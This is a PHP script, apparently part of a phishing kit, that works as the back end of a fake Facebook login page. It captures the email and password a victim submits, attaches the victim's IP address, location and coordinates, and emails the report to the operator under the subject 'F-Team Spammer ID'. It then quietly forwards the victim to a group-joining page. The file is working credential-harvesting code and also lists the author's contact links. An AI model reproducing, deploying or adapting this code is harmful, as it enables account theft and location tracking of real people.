<?php
// MENGAMBIL KONTROL
include 'setting.php';
include 'email.php';
include 'geolocation.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$link_grup = $_POST['link_grup'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == ""){
header("Location: index.php");
}else{

// KONTEN RESULT AKUN
$subjek = "F-Team Spammer ID | PUNYA SI $email";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/yRc51C8/header.png) no-repeat center center fixed; background-size: 100% 100%; width: 294; height: 190px; color: #fff; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
<div style="background: #0078ff; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #0078ff; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>FACEBOOK</th> 
</tr>
</table>
<div style="background: #0078ff; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Tambahan</div>
<table style="border-collapse: collapse; border-color: #0078ff; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['country_name'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['region_name'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['city'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LATITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['latitude'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LONGITUDE</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['longitude'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>'.$arpantek['ip'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #0078ff; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://www.facebook.com/putra.ar.104"><img style="margin: 5px;" width="30" src="https://i.ibb.co/yVdy3tf/fb.png"></a>
<a href="http://wa.me/6282282509311"><img style="margin: 5px;" width="30" src="https://i.ibb.co/CtDGmYV/icon.png"></a>
<a href="https://join.skype.com/invite/aUQCRZeC9HT0"><img style="margin: 5px;" width="30" src="https://i.ibb.co/0fjKvRD/1200px-Skype-logo-2019-present-svg.png"></a>
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($emailku, $subjek, $pesan, $headers);

// MENDAPATKAN DATA YANG DI-INPUT DAN MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<form id='arpantek' method='POST' action='joining.php'>
<input type='hidden' name='link_grup' value='$link_grup'>
</form>
<script type='text/javascript'>document.getElementById('arpantek').submit();</script>";
}
}
?>